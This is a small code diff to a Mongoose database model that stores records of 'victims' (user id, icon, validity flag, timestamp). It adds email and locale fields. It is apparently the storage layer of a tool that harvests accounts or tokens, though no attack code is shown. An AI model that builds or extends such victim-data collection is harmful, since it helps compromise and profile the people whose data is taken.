@@ -1,4 +1,4 @@
-import amongus, { Schema } from 'mongoose';
+import amongus, { models, Schema } from 'mongoose';
 
 const victimSchema = new Schema({
     userid: String,
@@ -10,8 +10,10 @@ const victimSchema = new Schema({
     icon: String,
     valid: Boolean,
     timestamp: Number,
+    email: String,
+    locale: String,
 });
 
-const Victim = amongus.models.victim || amongus.model('victim', victimSchema);
+const Victim = models.victim || amongus.model('victim', victimSchema);
 
 export default Victim;
